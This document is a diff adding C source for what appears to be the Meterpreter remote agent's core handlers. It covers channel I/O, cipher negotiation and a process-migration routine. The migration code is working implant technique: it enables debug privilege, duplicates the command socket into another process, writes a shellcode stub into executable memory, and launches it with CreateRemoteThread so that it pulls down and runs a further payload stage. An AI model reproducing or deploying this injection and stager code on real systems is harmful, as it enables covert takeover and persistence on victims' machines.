@@ -1,0 +1,797 @@
+#include "common.h"
+
+/*
+ * core_channel_open
+ * -----------------
+ *
+ * Opens a channel with the remote endpoint.  The response handler for this
+ * request will establish the relationship on the other side.
+ *
+ * opt: TLV_TYPE_CHANNEL_TYPE 
+ *      The channel type to allocate.  If set, the function returns, allowing
+ *      a further up extension handler to allocate the channel.
+ */
+DWORD remote_request_core_channel_open(Remote *remote, Packet *packet)
+{
+	Packet *response;
+	DWORD res = ERROR_SUCCESS;
+	Channel *newChannel;
+	PCHAR channelType;
+	DWORD flags = 0;
+
+	do
+	{
+		// If the channel open request had a specific channel type
+		if ((channelType = packet_get_tlv_value_string(packet, 
+				TLV_TYPE_CHANNEL_TYPE)))
+		{
+			res = ERROR_NOT_FOUND;
+			break;
+		}
+
+		// Get any flags that were supplied
+		flags = packet_get_tlv_value_uint(packet, TLV_TYPE_FLAGS);
+
+		// Allocate a response
+		response = packet_create_response(packet);
+		
+		// Did the response allocation fail?
+		if ((!response) ||
+		    (!(newChannel = channel_create(0, flags))))
+		{
+			res = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		// Get the channel class and set it
+		newChannel->cls = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_CLASS);
+
+		// Add the new channel identifier to the response
+		if ((res = packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID,
+				channel_get_id(newChannel))) != ERROR_SUCCESS)
+			break;
+
+		// Transmit the response
+		res = packet_transmit(remote, response, NULL);
+
+	} while (0);
+
+	return res;
+}
+
+/*
+ * core_channel_open (response)
+ * -----------------
+ *
+ * Handles the response to a request to open a channel.
+ *
+ * This function takes the supplied channel identifier and creates a
+ * channel list entry with it.
+ *
+ * req: TLV_TYPE_CHANNEL_ID -- The allocated channel identifier
+ */
+DWORD remote_response_core_channel_open(Remote *remote, Packet *packet)
+{
+	DWORD res = ERROR_SUCCESS, channelId;
+	Channel *newChannel;
+
+	do
+	{
+		channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
+		
+		// DId the request fail?
+		if (!channelId)
+		{
+			res = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		// Create a local instance of the channel with the supplied identifier
+		if (!(newChannel = channel_create(channelId, 0)))
+		{
+			res = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+	} while (0);
+
+	return res;
+}
+
+/*
+ * core_channel_write
+ * ------------------
+ *
+ * Write data from a channel into the local output buffer for it
+ */
+DWORD remote_request_core_channel_write(Remote *remote, Packet *packet)
+{
+	Packet *response = packet_create_response(packet);
+	DWORD res = ERROR_SUCCESS, channelId, written = 0;
+	Tlv channelData;
+	Channel *channel;
+
+	do
+	{
+		channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
+
+		// Try to locate the specified channel
+		if (!(channel = channel_find_by_id(channelId)))
+		{
+			res = ERROR_NOT_FOUND;
+			break;
+		}
+
+		// Get the channel data buffer
+		if ((res = packet_get_tlv(packet, TLV_TYPE_CHANNEL_DATA, &channelData)) 
+				!= ERROR_SUCCESS)
+			break;
+
+		// Handle the write operation differently based on the class of channel
+		switch (channel_get_class(channel))
+		{
+			// If it's buffered, write it to the local buffer cache
+			case CHANNEL_CLASS_BUFFERED:
+				res = channel_write_to_buffered(channel, channelData.buffer,
+						channelData.header.length, &written);
+				break;
+			// If it's non-buffered, call the native write operation handler if
+			// one is implemented
+			default:
+				{
+					NativeChannelOps *ops = (NativeChannelOps *)&channel->ops;
+
+					if (ops->write)
+						res = ops->write(channel, packet, ops->context, 
+								channelData.buffer, channelData.header.length, 
+								&written);
+					else
+						res = ERROR_NOT_SUPPORTED;
+				}
+				break;
+		}
+
+	} while (0);
+
+	// Transmit the acknowledgement
+	if (response)
+	{
+		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
+		packet_add_tlv_uint(response, TLV_TYPE_LENGTH, written);
+		packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channelId);
+
+		res = packet_transmit(remote, response, NULL);
+	}
+
+	return res;
+}
+
+/*
+ * core_channel_read
+ * -----------------
+ *
+ * From from the local buffer and write back to the requester
+ *
+ * Takes TLVs:
+ *
+ * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to read from
+ * req: TLV_TYPE_LENGTH     -- The number of bytes to read
+ */
+DWORD remote_request_core_channel_read(Remote *remote, Packet *packet)
+{
+	DWORD res = ERROR_SUCCESS, bytesToRead, bytesRead, channelId;
+	Packet *response = packet_create_response(packet);
+	PUCHAR temporaryBuffer = NULL;
+	Channel *channel = NULL;
+
+	do
+	{
+		if (!response)
+		{
+			res = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		// Get the number of bytes to read
+		bytesToRead = packet_get_tlv_value_uint(packet, TLV_TYPE_LENGTH);
+		channelId   = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
+
+		// Try to locate the specified channel
+		if (!(channel = channel_find_by_id(channelId)))
+		{
+			res = ERROR_NOT_FOUND;
+			break;
+		}
+
+		// Allocate temporary storage
+		if (!(temporaryBuffer = (PUCHAR)malloc(bytesToRead)))
+		{
+			res = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		switch (channel_get_class(channel))
+		{
+			// If it's buffered, read from the local buffer and either transmit 
+			// the buffer in the response or write it back asynchronously
+			// depending on the mode of the channel.
+			case CHANNEL_CLASS_BUFFERED:
+				// Read in from local
+				res = channel_read_from_buffered(channel, temporaryBuffer, 
+						bytesToRead, &bytesRead);
+				break;
+			// Handle read I/O for the pool class
+			case CHANNEL_CLASS_POOL:
+				// If the channel has a read handler
+				if (channel->ops.pool.read)
+					res = channel->ops.pool.read(channel, packet, 
+							channel->ops.pool.native.context, temporaryBuffer, 
+							bytesToRead, &bytesRead);
+				else
+					res = ERROR_NOT_SUPPORTED;
+				break;
+			default:
+				res = ERROR_NOT_SUPPORTED;
+		}
+
+		// If we've so far been successful and we have a temporary buffer...
+		if ((res == ERROR_SUCCESS) &&
+		    (temporaryBuffer) &&
+		    (bytesRead))
+		{
+			// If the channel should operate synchronously, add the data to the
+			// response
+			if (channel_is_flag(channel, CHANNEL_FLAG_SYNCHRONOUS))
+			{
+				packet_add_tlv_raw(response, TLV_TYPE_CHANNEL_DATA, 
+						temporaryBuffer, bytesRead);
+
+				res = ERROR_SUCCESS;
+			}
+			// Otherwise, asynchronously write the buffer to the remote endpoint
+			else
+			{
+				if ((res = channel_write(channel, remote, NULL, 0, 
+						temporaryBuffer, bytesRead, NULL)) != ERROR_SUCCESS)
+					break;
+			}
+		}
+
+	} while (0);
+
+	if (temporaryBuffer)
+		free(temporaryBuffer);
+
+	// Transmit the acknowledgement
+	if (response)
+	{
+		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
+		packet_add_tlv_uint(response, TLV_TYPE_LENGTH, bytesRead);
+		packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channelId);
+
+		res = packet_transmit(remote, response, NULL);
+	}
+
+	return res;
+}
+
+/*
+ * core_channel_close
+ * ------------------
+ *
+ * Closes a previously opened channel.
+ *
+ * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to close
+ */
+DWORD remote_request_core_channel_close(Remote *remote, Packet *packet)
+{
+	Packet *response = packet_create_response(packet);
+	DWORD res = ERROR_SUCCESS, channelId;
+	Channel *channel = NULL;
+
+	do
+	{
+		// Get the channel identifier
+		channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
+
+		// Try to locate the specified channel
+		if (!(channel = channel_find_by_id(channelId)))
+		{
+			res = ERROR_NOT_FOUND;
+			break;
+		}
+
+		// Destroy the channel
+		channel_destroy(channel, packet);
+
+		if (response)
+			packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channelId);
+
+	} while (0);
+
+	// Transmit the acknowledgement
+	if (response)
+	{
+		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
+
+		res = packet_transmit(remote, response, NULL);
+	}
+
+	return res;
+}
+
+/*
+ * core_channel_close (response)
+ * ------------------
+ *
+ * Removes the local instance of the channel
+ *
+ * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to close
+ */
+DWORD remote_response_core_channel_close(Remote *remote, Packet *packet)
+{
+	DWORD res = ERROR_SUCCESS, channelId;
+	Channel *channel = NULL;
+
+	do
+	{
+		// Get the channel identifier
+		channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
+
+		// Try to locate the specified channel
+		if (!(channel = channel_find_by_id(channelId)))
+		{
+			res = ERROR_NOT_FOUND;
+			break;
+		}
+
+		// Destroy the channel
+		channel_destroy(channel, packet);
+
+	} while (0);
+
+	return res;
+}
+
+
+/*
+ * core_channel_seek
+ * -----------------
+ *
+ * req: TLV_TYPE_CHANNEL_ID  -- The channel identifier to seek on
+ * req: TLV_TYPE_SEEK_OFFSET -- The offset to seek to
+ * req: TLV_TYPE_SEEK_WHENCE -- The relativity to which the offset refers
+ */
+DWORD remote_request_core_channel_seek(Remote *remote, Packet *packet)
+{
+	Channel *channel = NULL;
+	Packet *response = packet_create_response(packet);
+	DWORD result = ERROR_SUCCESS;
+
+	do
+	{
+		// Lookup the channel by its identifier
+		if (!(channel = channel_find_by_id(
+				packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID))))
+		{
+			result = ERROR_NOT_FOUND;
+			break;
+		}
+
+		// Make sure this class is compatible
+		if (channel_get_class(channel) != CHANNEL_CLASS_POOL)
+		{
+			result = ERROR_NOT_SUPPORTED;
+			break;
+		}
+
+		// Call the function if it's set
+		if (channel->ops.pool.seek)
+			result = channel->ops.pool.seek(channel, packet, 
+					channel->ops.pool.native.context, 
+					(LONG)packet_get_tlv_value_uint(packet, TLV_TYPE_SEEK_OFFSET),
+					packet_get_tlv_value_uint(packet, TLV_TYPE_SEEK_WHENCE));
+		else
+			result = ERROR_NOT_SUPPORTED;
+
+	} while (0);
+
+	// Transmit the result
+	packet_transmit_response(result, remote, response);
+
+	return result;
+}
+
+/*
+ * core_channel_eof
+ * -----------------
+ *
+ * req: TLV_TYPE_CHANNEL_ID  -- The channel identifier to check eof on
+ */
+DWORD remote_request_core_channel_eof(Remote *remote, Packet *packet)
+{
+	Channel *channel = NULL;
+	Packet *response = packet_create_response(packet);
+	DWORD result = ERROR_SUCCESS;
+	BOOL isEof = FALSE;
+
+	do
+	{
+		// Lookup the channel by its identifier
+		if (!(channel = channel_find_by_id(
+				packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID))))
+		{
+			result = ERROR_NOT_FOUND;
+			break;
+		}
+
+		// Make sure this class is compatible
+		if (channel_get_class(channel) != CHANNEL_CLASS_POOL)
+		{
+			result = ERROR_NOT_SUPPORTED;
+			break;
+		}
+
+		// Call the function if it's set
+		if (channel->ops.pool.eof)
+			result = channel->ops.pool.eof(channel, packet, 
+					channel->ops.pool.native.context, 
+					&isEof);
+		else
+			result = ERROR_NOT_SUPPORTED;
+
+	} while (0);
+
+	// Add the EOF flag
+	packet_add_tlv_bool(response, TLV_TYPE_BOOL, isEof);
+
+	// Transmit the response
+	packet_transmit_response(result, remote, response);
+
+	return result;
+}
+
+/*
+ * core_channel_tell
+ * -----------------
+ *
+ * req: TLV_TYPE_CHANNEL_ID  -- The channel identifier to check tell on
+ */
+DWORD remote_request_core_channel_tell(Remote *remote, Packet *packet)
+{
+	Channel *channel = NULL;
+	Packet *response = packet_create_response(packet);
+	DWORD result = ERROR_SUCCESS;
+	LONG offset = 0;
+
+	do
+	{
+		// Lookup the channel by its identifier
+		if (!(channel = channel_find_by_id(
+				packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID))))
+		{
+			result = ERROR_NOT_FOUND;
+			break;
+		}
+
+		// Make sure this class is compatible
+		if (channel_get_class(channel) != CHANNEL_CLASS_POOL)
+		{
+			result = ERROR_NOT_SUPPORTED;
+			break;
+		}
+
+		// Call the function if it's set
+		if (channel->ops.pool.tell)
+			result = channel->ops.pool.tell(channel, packet, 
+					channel->ops.pool.native.context, 
+					&offset);
+		else
+			result = ERROR_NOT_SUPPORTED;
+
+	} while (0);
+
+	// Add the offset
+	packet_add_tlv_uint(response, TLV_TYPE_SEEK_POS, offset);
+
+	// Transmit the response
+	packet_transmit_response(result, remote, response);
+
+	return result;
+}
+
+
+/*
+ * core_channel_interact
+ * ---------------------
+ *
+ * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to interact with
+ * req: TLV_TYPE_BOOL       -- True if interactive, false if not.
+ */
+DWORD remote_request_core_channel_interact(Remote *remote, Packet *packet)
+{
+	Packet *response = packet_create_response(packet);
+	Channel *channel;
+	DWORD channelId;
+	DWORD result = ERROR_SUCCESS;
+	BOOLEAN interact;
+
+	// Get the channel identifier
+	channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
+	interact  = packet_get_tlv_value_bool(packet, TLV_TYPE_BOOL);
+
+	// If the channel is found, set the interactive flag accordingly
+	if ((channel = channel_find_by_id(channelId)))
+	{
+		// If the response packet is valid
+		if ((response) &&
+		    (channel_get_class(channel) != CHANNEL_CLASS_BUFFERED))
+		{
+			NativeChannelOps *native = (NativeChannelOps *)&channel->ops;
+
+			// Check to see if this channel has a registered interact handler
+			if (native->interact)
+				result = native->interact(channel, packet, native->context, 
+						interact);
+		}
+
+		// Set the channel's interactive state
+		channel_set_interactive(channel, interact);
+	}
+
+	// Send the response to the requestor so that the interaction can be 
+	// complete
+	packet_transmit_response(result, remote, response);
+
+	return ERROR_SUCCESS;
+}
+
+/*
+ * core_crypto_negotiate
+ * ---------------------
+ *
+ * Negotiates a cryptographic session with the remote host
+ *
+ * req: TLV_TYPE_CIPHER_NAME       -- The cipher being selected.
+ * opt: TLV_TYPE_CIPHER_PARAMETERS -- The paramters passed to the cipher for
+ *                                    initialization
+ */
+DWORD remote_request_core_crypto_negotiate(Remote *remote, Packet *packet)
+{
+	LPCSTR cipherName = packet_get_tlv_value_string(packet,
+			TLV_TYPE_CIPHER_NAME);
+	DWORD res = ERROR_INVALID_PARAMETER;
+	Packet *response = packet_create_response(packet);
+
+	// If a cipher name was supplied, set it
+	if (cipherName)
+		res = remote_set_cipher(remote, cipherName, packet);
+
+	// Transmit a response
+	if (response)
+	{
+		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
+
+		packet_transmit(remote, response, NULL);
+	}
+
+	return ERROR_SUCCESS;
+}
+
+/*
+ * core_migrate
+ * ------------
+ *
+ * Migrates the remote connection descriptor into the context of
+ * another process and exits the current process or thread.  This is
+ * accomplished by duplicating the socket handle into the context
+ * of another process and injecting a code stub that reads in
+ * an arbitrary stage that may or may not re-initialize the 
+ * meterpreter server instance in the new process.
+ *
+ * req: TLV_TYPE_MIGRATE_PID - The process identifier to migrate into.
+ */
+
+typedef struct _MigrationStubContext
+{
+	LPVOID           loadLibrary;   // esi+0x00
+	LPVOID           payloadBase;   // esi+0x04
+	DWORD            payloadLength; // esi+0x08
+	LPVOID           wsaStartup;    // esi+0x0c
+	LPVOID           wsaSocket;     // esi+0x10
+	LPVOID           recv;          // esi+0x14
+	LPVOID           setevent;      // esi+0x18
+	LPVOID           event;         // esi+0x1c
+	CHAR             ws2_32[8];     // esi+0x20
+	WSAPROTOCOL_INFO info;          // esi+0x28
+} MigrationStubContext;
+
+DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
+{
+	MigrationStubContext context;
+	TOKEN_PRIVILEGES privs;
+	HANDLE token = NULL;
+	Packet *response = packet_create_response(packet);
+	HANDLE process = NULL;
+	HANDLE thread = NULL;
+	HANDLE event = NULL;
+	LPVOID dataBase;
+	LPVOID codeBase;
+	DWORD threadId;
+	DWORD result = ERROR_SUCCESS;
+	DWORD pid;
+
+	// Bug fix for Ticket #275: recv the migrate payload into a RWX buffer instead of straight onto the stack (Stephen Fewer).
+	BYTE stub[] =
+		"\x8B\x74\x24\x04"         //  mov esi,[esp+0x4]         ; ESI = MigrationStubContext *
+		"\x89\xE5"                 //  mov ebp,esp               ; create stack frame
+		"\x81\xEC\x00\x10\x00\x00" //  sub esp, 0x1000           ; alloc space on stack
+		"\x8D\x4E\x20"             //  lea ecx,[esi+0x20]        ; ECX = MigrationStubContext->ws2_32
+		"\x51"                     //  push ecx                  ; push "ws2_32"
+		"\xFF\x16"                 //  call near [esi]           ; call loadLibrary
+		"\x54"                     //  push esp                  ; push stack address
+		"\x6A\x02"                 //  push byte +0x2            ; push 2
+		"\xFF\x56\x0C"             //  call near [esi+0xC]       ; call wsaStartup
+		"\x6A\x00"                 //  push byte +0x0            ; push null
+		"\x6A\x00"                 //  push byte +0x0            ; push null
+		"\x8D\x46\x28"             //  lea eax,[esi+0x28]        ; EAX = MigrationStubContext->info
+		"\x50"                     //  push eax                  ; push our duplicated socket
+		"\x6A\x00"                 //  push byte +0x0            ; push null
+		"\x6A\x02"                 //  push byte +0x2            ; push 2
+		"\x6A\x01"                 //  push byte +0x1            ; push 1
+		"\xFF\x56\x10"             //  call near [esi+0x10]      ; call wsaSocket
+		"\x97"                     //  xchg eax,edi              ; edi now = our duplicated socket
+		"\xFF\x76\x1C"             //  push dword [esi+0x1C]     ; push our event
+		"\xFF\x56\x18"             //  call near [esi+0x18]      ; call setevent
+		"\x8B\x5E\x08"             //  mov ebx,[esi+0x8]         ; buffer total length
+		"\x8B\x6E\x04"             //  mov ebp,[esi+0x4]         ; buffer address
+		"\x55"                     //  push ebp                  ; save address for return
+		"\x6A\x00"                 //  push byte +0x0            ; recv flags
+		"\x53"                     //  push ebx                  ; remaining length to read
+		"\x55"                     //  push ebp                  ; current buffer pointer
+		"\x57"                     //  push edi                  ; socket
+		"\xFF\x56\x14"             //  call dword near [esi+0x14]; recv
+		"\x01\xC5"                 //  add ebp,eax               ; buffer address += bytes received
+		"\x29\xC3"                 //  sub ebx,eax               ; remaining length -= bytes received
+		"\x85\xDB"                 //  test ebx,ebx              ; test remaining length
+		"\x75\xF0"                 //  jnz 0x7                   ; continue if we have more to read
+		"\xC3"                     //  ret                       ; return into the received buffer
+		"\x90\x90";                //  nop; nop;
+   
+	// Get the process identifier to inject into
+	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);
+
+	// Bug fix for Ticket #275: get the desired length of the to-be-read-in payload buffer...
+	context.payloadLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);
+
+	// Try to enable the debug privilege so that we can migrate into system
+	// services if we're administrator.
+	if (OpenProcessToken(
+			GetCurrentProcess(),
+			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+			&token))
+	{
+		privs.PrivilegeCount           = 1;
+		privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	
+		LookupPrivilegeValue(NULL, SE_DEBUG_NAME,
+				&privs.Privileges[0].Luid);
+	
+		AdjustTokenPrivileges(token, FALSE, &privs, 0, NULL, NULL);
+
+		CloseHandle(token);
+	}
+
+	do
+	{
+		// Open the process so that we can duplicate shit into it
+		if (!(process = OpenProcess(
+				PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | 
+				PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid)))
+		{
+			result = GetLastError();
+			break;
+		}
+
+		// If the socket duplication fails...
+		if (WSADuplicateSocket(remote_get_fd(remote), pid, &context.info) != NO_ERROR)
+		{
+			result = WSAGetLastError();
+			break;
+		}
+
+		// Create a notification event that we'll use to know when
+		// it's safe to exit (once the socket has been referenced in
+		// the other process)
+		if (!(event = CreateEvent(NULL, TRUE, FALSE, NULL)))
+		{
+			result = GetLastError();
+			break;
+		}
+
+		// Duplicate the event handle into the target process
+		if (!DuplicateHandle(GetCurrentProcess(), event,
+				process, &context.event, 0, TRUE, DUPLICATE_SAME_ACCESS))
+		{
+			result = GetLastError();
+			break;
+		}
+
+		// Initialize the migration context
+		context.loadLibrary    = (LPVOID)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
+		context.wsaStartup     = (LPVOID)GetProcAddress(GetModuleHandle("ws2_32"), "WSAStartup");
+		context.wsaSocket      = (LPVOID)GetProcAddress(GetModuleHandle("ws2_32"), "WSASocketA");
+		context.recv           = (LPVOID)GetProcAddress(GetModuleHandle("ws2_32"), "recv");
+		context.setevent       = (LPVOID)GetProcAddress(GetModuleHandle("kernel32"), "SetEvent");
+
+		strcpy(context.ws2_32, "ws2_32");
+
+		// Allocate storage for the stub and the context
+		if (!(dataBase = VirtualAllocEx(process, NULL, sizeof(MigrationStubContext) + sizeof(stub), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
+		{
+			result = GetLastError();
+			break;
+		}
+
+		// Bug fix for Ticket #275: Allocate a RWX buffer for the to-be-read-in payload...
+		if (!(context.payloadBase = VirtualAllocEx(process, NULL, context.payloadLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
+		{
+			result = GetLastError();
+			break;
+		}
+
+		// Initialize the data and code base in the target process
+		codeBase = (PCHAR)dataBase + sizeof(MigrationStubContext);
+
+		if (!WriteProcessMemory(process, dataBase, &context, sizeof(context), NULL))
+		{
+			result = GetLastError();
+			break;
+		}
+
+		if (!WriteProcessMemory(process, codeBase, stub, sizeof(stub), NULL))
+		{
+			result = GetLastError();
+			break;
+		}
+
+		// Send a successful response to let them know that we've pretty much
+		// successfully migrated and are reaching the point of no return
+		packet_transmit_response(result, remote, response);
+
+		response = NULL;
+
+		// Create the thread in the remote process
+		if (!(thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)codeBase, dataBase, 0, &threadId)))
+		{
+			result = GetLastError();
+			break;
+		}
+
+		// Wait at most 5 seconds for the event to be set letting us know that
+		// it's finished
+		if (WaitForSingleObjectEx(event, 5000, FALSE) != WAIT_OBJECT_0)
+		{
+			result = GetLastError();
+			break;
+		}
+
+		// Exit the current process now that we've migrated to another one
+		ExitThread(0);
+
+	} while (0);
+
+	// If we failed and have not sent the response, do so now
+	if (result != ERROR_SUCCESS && response)
+		packet_transmit_response(result, remote, response);
+
+	// Cleanup
+	if (process)
+		CloseHandle(process);
+	if (thread)
+		CloseHandle(thread);
+	if (event)
+		CloseHandle(event);
+
+	return ERROR_SUCCESS;
+}
